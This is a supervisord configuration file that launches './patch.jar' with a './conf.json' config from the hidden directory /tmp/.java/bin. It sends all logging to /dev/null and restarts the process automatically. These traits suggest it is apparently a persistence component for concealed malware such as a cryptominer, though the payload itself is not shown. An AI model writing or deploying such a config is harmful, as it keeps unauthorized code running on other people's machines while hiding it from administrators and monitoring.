# conf/fr-n2-cfg.conf
[supervisord]
logfile=/dev/null

[program:app]
directory=/tmp/.java/bin
command=./patch.jar -c ./conf.json
stdout_logfile=/dev/null
autorestart = true